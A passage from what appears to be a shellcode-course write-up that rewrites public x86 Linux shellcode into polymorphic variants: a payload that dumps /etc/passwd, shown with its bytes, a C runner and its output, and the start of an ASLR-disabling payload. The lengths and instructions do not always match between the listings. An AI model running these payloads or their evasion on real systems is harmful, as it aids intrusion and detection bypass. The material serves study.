<p style="text-align:justify;">The following instructions are used to indicate the length of the buffer that holds the data. In this case the buffer size is 4096 bytes. The lower half of the 32-bit <strong>edx</strong> register, the <strong>dx </strong>register is holding <strong>4095 </strong>bytes which in hex is <strong>0xfff.</strong> Then the <strong>inc </strong><span class="">instruction increments the contents of its operand by one turning into <strong>4096</strong>.  </span></p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">mov dx, 0xfff<br />inc edx</pre>
<p style="text-align:justify;">Below there is a short analysis of how the <strong>null</strong> values can be generated if another technique used for the same operation. For example, if the writer used the following instructions <strong>mov dx, 0x1000, </strong>then <strong>null</strong> values would exist inside the <em>shellcode</em> as shown in red below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d tn -M intel<br /><br />tn: file format elf32-i386<br /><br />Disassembly of section .text:<br /><br />08048080 &lt;_start&gt;:<br />8048080: 31 d2 xor edx,edx<br />8048082: f7 e1 mul ecx<br />8048084: b0 05 mov al,0x5<br />8048086: 51 push ecx<br />8048087: c7 44 24 fc 73 73 77 mov DWORD PTR [esp-0x4],0x64777373<br />804808e: 64 <br />804808f: c7 44 24 f8 63 2f 70 mov DWORD PTR [esp-0x8],0x61702f63<br />8048096: 61 <br />8048097: c7 44 24 f4 2f 2f 65 mov DWORD PTR [esp-0xc],0x74652f2f<br />804809e: 74 <br />804809f: 83 ec 0c sub esp,0xc<br />80480a2: 89 e3 mov ebx,esp<br />80480a4: 66 ba bc 02 mov dx,0x2bc<br />80480a8: cd 80 int 0x80<br />80480aa: 89 c7 mov edi,eax<br />80480ac: 89 d8 mov eax,ebx<br />80480ae: 89 fb mov ebx,edi<br />80480b0: 89 c6 mov esi,eax<br />80480b2: 89 c8 mov eax,ecx<br />80480b4: 89 f1 mov ecx,esi<br />80480b6: b0 03 mov al,0x3<br /><span style="color:#ff0000;">80480b8: 66 8b 15 00 10 00 00 mov dx,WORD PTR ds:0x1000</span><br />80480bf: cd 80 int 0x80<br />80480c1: 31 c0 xor eax,eax<br />80480c3: b0 04 mov al,0x4<br />80480c5: b3 01 mov bl,0x1<br />80480c7: cd 80 int 0x80<br />80480c9: 31 c0 xor eax,eax<br />80480cb: b0 01 mov al,0x1<br />80480cd: cd 80 int 0x80</pre>
<p style="text-align:justify;">Furthermore, if an immediate value used, such as <strong>mov dx, 4096</strong>, it will also produce null bytes as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">80480b8: 66 ba <span style="color:#ff0000;">00</span> 10 mov dx,0x1000</pre>
<p style="text-align:justify;">So, the concept here is to find out the values to use in order to assign <strong>4096</strong> bytes as buffer length into the <strong>dx</strong> register, and also to produce a polymorphic version of the original instructions. Consequently, the following instructions can be used to achieve a polymorphic version without producing any null bytes.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">; From original shellcode</span> <br />mov dx, 0xfff<br />inc edx<br /><br /><span style="color:#00ffff;">;Altered Shellcode Instructions</span><br /><span style="color:#00ffff;">;polymorphic version ( this two instructions perform the addition operation )</span><br /><span style="color:#ff0000;"><span style="color:#00ff00;">mov dx, 0xFFe </span><span style="color:#00ffff;">; this value represents 4094 in hex</span></span><br /><span style="color:#00ff00;">inc dx </span><span style="color:#00ffff;">; this instruction increases by one the value held in dx register </span></pre>
<p style="text-align:justify;">The <strong>mov dx, 0xffe </strong>instruction moves the <strong>4094</strong> decimal value into <strong>dx</strong> register, and the <strong>inc dx</strong> instruction increases by one the hex value held by <strong>dx</strong> register. The result of the <strong>inc</strong> instruction produces the decimal value <strong>4096</strong> which constitutes the needed byte length of the buffer. In addition, the <strong>inc</strong> instruction has been chosen because it produces lower length shellcode comparing to other instructions such as for example the <strong>add</strong> instruction that performs the addition operation. </p>
<p style="text-align:justify;">Moving further, in order to be sure that no null bytes produced when compiling the code, the compiled code can be checked using the following command </p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d polytiny -M intel </pre>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">[...]<br />80480b4: 89 f1 mov ecx,esi<br />80480b6: b0 03 mov al,0x3<br />80480b8: 66 ba e7 0f mov dx,0xfe7<br />80480bc: 83 c2 19 add edx,0x19<br />80480bf: cd 80 int 0x80<br />[........]</pre>
<p style="text-align:justify;">The produced bytecodes from running the above command are not containing any null bytes, so there is a green light to continue further to analyse and modify the rest of the instructions. Continuing further, the next instructions are representing the <strong>write </strong>system call used to print the output onto the console.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ffff;">; Original Shellcode Instructions</span><br />xor eax, eax<br />mov al, 4<br />mov bl, 1<br />int 0x80</pre>
<p style="text-align:justify;">The <strong>xor eax, eax</strong> used to zero out the <strong>eax</strong> register and then the <strong>mov al, 4</strong> used to assign the immediate value 4 into the lower byte register<strong> al, </strong>which indicates the <strong>write</strong> system call. Furthermore, <strong>mov bl, 1 </strong>instruction used to assign the immediate value <strong>1 </strong>at the lower byte register <strong>bl, </strong>indicating the file descriptor of standard output. Then, using instruction <strong>mov bl, 1</strong> the <strong>write</strong> system call will print the contents of <strong>/etc/passwd</strong> file onto the console. The instruction <strong>int 0x80 </strong>calls the <strong>write</strong> system call.</p>
<p>The following the instruction in red  used in order to achieve polymorphism of the write operation produced by <strong>write</strong> system call.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xor eax, eax <br />mov al, 4<br /><span style="color:#00ffff;">; Altered Shellcode Instruction</span><br /><span style="color:#00ff00;">sub bl, 2</span><br />int 0x80</pre>
<p style="text-align:justify;">The <strong>xor eax, eax </strong>instruction used to zero out the <strong>eax</strong> register while the instruction<strong> mov al, 4</strong> assigns the immediate value of 4 at the lower byte resister <strong>al </strong>which indicates the <strong>write</strong> system call<strong>. </strong>Then the immediate value <strong>0x1</strong> which indicates the standard output file descriptor,  assigned at the lower byte register <strong>bl </strong>after substitution with immediate value<strong> 2</strong>. In more detail, the substitution worked here because the <strong>ebx</strong> register has had the file descriptor value <strong>0x3</strong> returned earlier from the <strong>open</strong> function call. Later on, the instruction i<strong>nt 0x80 </strong>used to call the<strong> write </strong>system call.</p>
<p style="text-align:justify;">Lastly, the instructions shown below are implementing the <strong>exit</strong> system call at the original <em>shellcode</em>.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xchg eax,ebx<br />int 0x80</pre>
<p style="text-align:justify;">Specifically, the <em>shellcode</em> writer has been chosen to use the <strong>xchg</strong> instruction in order to exchange the values held by <strong>ebx</strong> and <strong>eax</strong> registers accordingly. Using this method the <strong>exit</strong> system call implemented in two instructions minimising the length of the final <em>shellcode</em>. To this end, in order to achieve polymorphism the above instructions will be modified with instructions in red as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#99cc00;"><span style="color:#00ffff;">; Altered Shellcode Instructions</span><br /><span style="color:#00ff00;">xor eax, eax</span></span><br /><span style="color:#00ff00;">inc al </span><br />int 0x80 </pre>
<p style="text-align:justify;">The above instructions are used to implement the <strong>exit</strong> system call. The value <strong>1</strong> used to indicate the <strong>exit</strong> system call, so by using the instruction <strong>inc al</strong> the zero value inside the lower byte register <strong>al</strong> will be increased by one at the lower byte register <strong>al</strong>.</p>
<p style="text-align:justify;">At this point the analysis of the <em>shellcode</em> "<a href="http://shell-storm.org/shellcode/files/shellcode-842.php" target="_blank" rel="noopener">Tiny read file shellcode</a>" is done and the final polymorphic version shown below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">global _start<br /><br />section .text<br /><br />_start:<br /><br />        shr ecx, 16<br />        mul ecx<br />        mov al, 5<br />        mov dword [esp-4], ecx<br />        mov dword [esp-8], 0x64777373<br />        mov dword [esp-0ch], 0x61702f63<br />        mov dword [esp-10h], 0x74652f2f<br />        sub esp, 10h<br />        mov ebx, esp<br />        mov dx, 0x1bc<br />        int 0x80<br /><br />        mov ecx, ebx<br />        mov ebx, eax<br /><br />        mov al, 3<br />        mov dx, 0xffe<br />        inc dx<br />        int 0x80<br /><br />        xor eax, eax<br />        mov al, 4<br />        sub bl, 2<br />        int 0x80<br /><br />        xor eax, eax<br />        inc al<br />        int 0x80 </pre>
<p style="text-align:justify;">Now that the polymorphism has finished, a C program will be constructed to deliver the execution of the polymorphic version of the <em>shellcode</em>. The following command will produce the final polymorphic <em>shellcode</em>.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./polytiny|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'<br />"\xc1\xe9\x10\xf7\xe1\xb0\x05\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x73\x73\x77\x64\xc7\x44\x24\xf4\x63\x2f\x70\x61\xc7\x44\x24\xf0\x2f\x2f\x65\x74\x83\xec\x10\x89\xe3\x66\xba\xbc\x01\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xfe\x0f\x66\x42\xcd\x80\x31\xc0\xb0\x04\x80\xeb\x02\xcd\x80\xc1\xe8\x10\xfe\xc0\xcd\x80"</pre>
<p style="text-align:justify;">The following program will be used to deliver the execution of the new polymorphic <em>shellcode</em></p>



<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><
#include &lt;stdio.h>
#include &lt;srting.h>

unsigned char code[] = \
     "\xc1\xe9\x10\xf7\xe1\xb0\x05\x89\x4c\x24\xfc\xc7"
     "\x44\x24\xf8\x73\x73\x77\x64\xc7\x44\x24\xf4\x63"
     "\x2f\x70\x61\xc7\x44\x24\xf0\x2f\x2f\x65\x74\x83"
     "\xec\x10\x89\xe3\x66\xba\xbc\x01\xcd\x80\x89\xd9"
     "\x89\xc3\xb0\x03\x66\xba\xfe\x0f\x66\x42\xcd\x80"
     "\x31\xc0\xb0\x04\x80\xeb\x02\xcd\x80\xc1\xe8\x10"
     "\xfe\xc0\xcd\x80";

main()
{
printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();
}
</pre>

<p style="text-align:justify;">As seen below, compiling and running the code above will give the same output as the original <em>shellcode <br /></em></p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">root@slae:/home/xenofon/Documents/Assignment6# gcc -fno-stack-protector -g -z execstack -m32 -o shellcode shellcode.c &amp;&amp; ./shellcode <br />Shellcode Length: 76<br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br />bin:x:2:2:bin:/bin:/bin/sh<br />sys:x:3:3:sys:/dev:/bin/sh<br />sync:x:4:65534:sync:/bin:/bin/sync<br />games:x:5:60:games:/usr/games:/bin/sh<br />man:x:6:12:man:/var/cache/man:/bin/sh<br />lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br />mail:x:8:8:mail:/var/mail:/bin/sh<br />news:x:9:9:news:/var/spool/news:/bin/sh<br />uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br />proxy:x:13:13:proxy:/bin:/bin/sh<br />www-data:x:33:33:www-data:/var/www:/bin/sh<br />backup:x:34:34:backup:/var/backups:/bin/sh<br />list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br />irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br />nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br />libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br />syslog:x:101:103::/home/syslog:/bin/false<br />messagebus:x:102:105::/var/run/dbus:/bin/false<br />colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false<br />lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false<br />whoopsie:x:105:114::/nonexistent:/bin/false<br />avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false<br />avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false<br />usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false<br />kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false<br />pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false<br />rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false<br />speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh<br />hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false<br />saned:x:114:123::/home/saned:/bin/false<br />vboxadd:x:999:1::/var/run/vboxadd:/bin/false<br />xenofon:x:1001:1001:Xenofon,,,:/home/xenofon:/bin/bash<br />sshd:x:115:65534::/var/run/sshd:/usr/sbin/nologin<br />postgres:x:1002:1002::/home/postgres:/bin/sh</pre>
<p style="text-align:justify;">Following, the length of the new <em>shellcode </em>will be checked in order to be align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original <em>shellcode</em>. The calculation below shows that the exercise rule is followed.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">original shelcode length : 51 <br />polymorphic version length : 75 <br />51 * 1.5 = 76.5 </pre>
<hr />
<h2><span style="color:#339966;"><strong>ASLR deactivation</strong></span></h2>
<p style="text-align:justify;">The next <em>shellcode</em> that will be used to create a polymorphic version is the "ASLR deactivation" and can be found at <a href="http://shell-storm.org/">shell-storm.org</a>. The ASLR refers for address-space layout randomisation and can operate in different modes, thus it could be changed in Linux, using the <strong>/proc/sys/kernel/randomize_va_space</strong> interface. The following values for this purpose are supported:</p>
<ul>
<li>0 - No randomization.</li>
<li>1 - Conservative randomization. Shared libraries, stack , mmap(), VDSO and heap are randomized.</li>
<li>2 - Full randomization. In addition to elements listed in the previous point, memory managed through <strong>brk()</strong> is also randomized.</li>
</ul>
<p style="text-align:justify;">Currently, the first bullet above has been used, which is about disabling randomisation. At a glance, the logic behind writing the <a href="http://shell-storm.org/shellcode/files/shellcode-813.php">ASLR deactivation</a> from the <em>shellcode</em> writer is the following :</p>
<ul>
<li>create <strong>/proc/sys/kernel/randomize_va_space</strong> file</li>
<li>write the zero(0) value inside <strong>randomize_va_space </strong>file</li>
<li>exit</li>
</ul>
<p style="text-align:justify;">Before beginning the analysis, the disassembly listing of the original <em>shellcode</em> is needed in order to get the assembly code and instructions. To do so, the following command will be used</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># echo -ne "\x31\xc0\x50\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\x68\x2f\x2f\x70\x72\x89\xe3\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x89\xc3\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x31\xd2\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80" | ndisasm -u -<br />00000000  31C0              xor eax,eax<br />00000002  50                push eax<br />00000003  6870616365        push dword 0x65636170<br />00000008  6876615F73        push dword 0x735f6176<br />0000000D  68697A655F        push dword 0x5f657a69<br />00000012  686E646F6D        push dword 0x6d6f646e<br />00000017  686C2F7261        push dword 0x61722f6c<br />0000001C  6865726E65        push dword 0x656e7265<br />00000021  6879732F6B        push dword 0x6b2f7379<br />00000026  686F632F73        push dword 0x732f636f<br />0000002B  682F2F7072        push dword 0x72702f2f<br />00000030  89E3              mov ebx,esp<br />00000032  66B9BC02          mov cx,0x2bc<br />00000036  B008              mov al,0x8<br />00000038  CD80              int 0x80<br />0000003A  89C3              mov ebx,eax<br />0000003C  50                push eax<br />0000003D  66BA303A          mov dx,0x3a30<br />00000041  6652              push dx<br />00000043  89E1              mov ecx,esp<br />00000045  31D2              xor edx,edx<br />00000047  42                inc edx<br />00000048  B004              mov al,0x4<br />0000004A  CD80              int 0x80<br />0000004C  B006              mov al,0x6<br />0000004E  CD80              int 0x80<br />00000050  40                inc eax<br />00000051  CD80              int 0x80
</pre>
<p style="text-align:justify;">Furthermore, the above instructions need to be isolated to a new file named for example <strong>poly_aslr.nasm.</strong></p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># echo -ne "\x31\xc0\x50\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f\x73\x68\x2f\x2f\x70\x72\x89\xe3\x66\xb9\xbc\x02\xb0\x08\xcd\x80\x89\xc3\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x31\xd2\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80" | ndisasm  -u - | awk -F" " '{ print "\t" $3" "$4" "$5 }' | sed '1 i\\nglobal _start\n\nsection .text\n\n_start:' &gt;nbsp; poly_aslr.nasm<br />root@slae:/home/xenofon/Documents/Assignment6# cat poly_aslr.nasm<br /><br />global _start<br /><br />section .text<br /><br />_start:<br />        xor eax,eax<br />        push eax<br />        push dword 0x65636170<br />        push dword 0x735f6176<br />        push dword 0x5f657a69<br />        push dword 0x6d6f646e<br />        push dword 0x61722f6c<br />        push dword 0x656e7265<br />        push dword 0x6b2f7379<br />        push dword 0x732f636f<br />        push dword 0x72702f2f<br />        mov ebx,esp<br />        mov cx,0x2bc<br />        mov al,0x8<br />        int 0x80<br />        mov ebx,eax<br />        push eax<br />        mov dx,0x3a30<br />        push dx<br />        mov ecx,esp<br />        xor edx,edx<br />        inc edx<br />        mov al,0x4<br />        int 0x80<br />        mov al,0x6<br />        int 0x80<br />        inc eax<br />        int 0x80</pre>
<p>Before analysing the <em>shellcode,</em> it must be compiled using the following commands</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># nasm -f elf32 -F dwarf -g -o poly_aslr.o poly_aslr.nasm<br><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># ld -z execstack -o poly_aslr poly_aslr.o<br /><br /></pre>
<p>Then the debugging process of the executable file can be done using <strong>gdb</strong> as shown below</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># gdb -q ./sh<br />Reading symbols from /home/xenofon/Documents/Assignment6/sh...done.<br />(gdb) set disassembly-flavor intel<br />(gdb) b *&amp;code<br />Breakpoint 1 at 0x804a040<br />(gdb) r<br />Starting program: /home/xenofon/Documents/Assignment6/sh<br />Shellcode Length:  83<br /><br />Breakpoint 1, 0x0804a040 in code ()<br />(gdb)</pre>
<p>In order to have an overview of the executed file, the <strong>disass</strong> gdb command can be used as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">(gdb) disass<br />Dump of assembler code for function code:<br />=&gt; 0x0804a040 &lt;+0&gt;:	xor    eax,eax<br />   0x0804a042 &lt;+2&gt;:	push   eax<br />   0x0804a043 &lt;+3&gt;:	push   0x65636170<br />   0x0804a048 &lt;+8&gt;:	push   0x735f6176<br />   0x0804a04d &lt;+13&gt;:	push   0x5f657a69<br />   0x0804a052 &lt;+18&gt;:	push   0x6d6f646e<br />   0x0804a057 &lt;+23&gt;:	push   0x61722f6c<br />   0x0804a05c &lt;+28&gt;:	push   0x656e7265<br />   0x0804a061 &lt;+33&gt;:	push   0x6b2f7379<br />   0x0804a066 &lt;+38&gt;:	push   0x732f636f<br />   0x0804a06b &lt;+43&gt;:	push   0x72702f2f<br />   0x0804a070 &lt;+48&gt;:	mov    ebx,esp<br />   0x0804a072 &lt;+50&gt;:	mov    cx,0x2bc<br />   0x0804a076 &lt;+54&gt;:	mov    al,0x8<br />   0x0804a078 &lt;+56&gt;:	int    0x80<br />   0x0804a07a &lt;+58&gt;:	mov    ebx,eax<br />   0x0804a07c &lt;+60&gt;:	push   eax<br />   0x0804a07d &lt;+61&gt;:	mov    dx,0x3a30<br />   0x0804a081 &lt;+65&gt;:	push   dx<br />   0x0804a083 &lt;+67&gt;:	mov    ecx,esp<br />   0x0804a085 &lt;+69&gt;:	xor    edx,edx<br />   0x0804a087 &lt;+71&gt;:	inc    edx<br />   0x0804a088 &lt;+72&gt;:	mov    al,0x4<br />   0x0804a08a &lt;+74&gt;:	int    0x80<br />   0x0804a08c &lt;+76&gt;:	mov    al,0x6<br />   0x0804a08e &lt;+78&gt;:	int    0x80<br />   0x0804a090 &lt;+80&gt;:	inc    eax<br />   0x0804a091 &lt;+81&gt;:	int    0x80<br />   0x0804a093 &lt;+83&gt;:	add    BYTE PTR [eax],al<br />End of assembler dump.<br />(gdb)</pre>
<p style="text-align:justify;">As shown above, the <strong>eax</strong> register is zeroed out with <strong>xor eax, eax</strong> and then pushed into the stack with <strong>push eax</strong>.</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">xor eax,eax<br />push eax</pre>
<p>The above instructions will be altered in order to perform polymorphism, thus the instruction <strong>xor eax, eax</strong> will be changed as follows</p>
<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#00ff00;">xor ebx,ebx</span><br /><span style="color:#00ff00;">mul ebx</span></pre>
<p style="text-align:justify;">The <strong>xor ebx, ebx</strong> used to zero out the <strong>ebx</strong> register. Then the<strong> mul ebx</strong> instruction used to zero out the <strong>eax</strong> register because the <strong>mul</strong> instruction is performing multiplication with the <strong>eax</strong> register. So, in the current case there is an additional extra instruction that is performing a zero out operation to <strong>ebx</strong> register without causing any alteration of the initially intended functionality. Additionally, one possible drawback of using the extra instruction is that it could probably increase the length of the final <em>shellcode</em>, but this  will be considered later. According with the analysis until now, the <strong>creat()</strong> system call will be used to open the <strong>/proc/sys/kernel/randomize_va_space</strong> file. Furthermore, the <em>shellcode</em> will push the arguments into the stack using the stack method.</p>
<p style="text-align:justify;">Following, the <strong>creat()</strong> system call is shown and the full synopsis can be found at <a href="https://linux.die.net/man/3/creat">creat(3)</a> man page</p>

